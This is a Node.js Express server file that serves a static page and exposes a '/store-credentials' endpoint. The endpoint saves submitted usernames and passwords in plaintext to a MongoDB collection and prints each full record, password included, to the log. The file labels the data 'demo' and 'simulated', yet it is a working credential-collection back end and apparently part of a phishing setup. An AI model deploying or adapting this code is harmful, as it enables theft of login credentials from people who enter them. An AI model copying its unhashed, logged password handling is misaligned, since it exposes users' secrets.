require("dotenv").config();

const express = require("express");
const { MongoClient } = require("mongodb");
const path = require("path");

const app = express();
app.use(express.json());

// Serve static files
app.use(express.static(path.join(__dirname, "public")));
app.use("/src", express.static(path.join(__dirname, "src")));

// MongoDB setup (reuse client in serverless)
const client = new MongoClient(process.env.MONGODB_URI, {
  maxPoolSize: 10
});

let collection;
let isConnected = false;

async function connectDB() {
  if (isConnected) return;

  try {
    await client.connect();
    const db = client.db("dkwin_data");
    collection = db.collection("credentials_demo");
    isConnected = true;
    console.log("MongoDB connected (demo mode)");
  } catch (err) {
    console.error("MongoDB connection failed:", err.message);
  }
}

// Connect once (serverless-safe)
connectDB();

// API endpoint
app.post("/store-credentials", async (req, res) => {
  try {
    const { type, username, password } = req.body;

    if (!collection) {
      return res.status(503).json({ error: "Database not ready" });
    }

    const record = {
      type,
      username,
      password, // ✅ FIXED
      demo: true,
      timestamp: new Date()
    };

    await collection.insertOne(record);

    console.log("Simulated data stored:", record);
    res.json({ message: "Demo data stored" });

  } catch (err) {
    console.error("DB insert error:", err);
    res.status(500).json({ error: "Database error" });
  }
});

// Main page
app.get("/", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "index.html"));
});

// Required for local testing (ignored by Vercel)
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
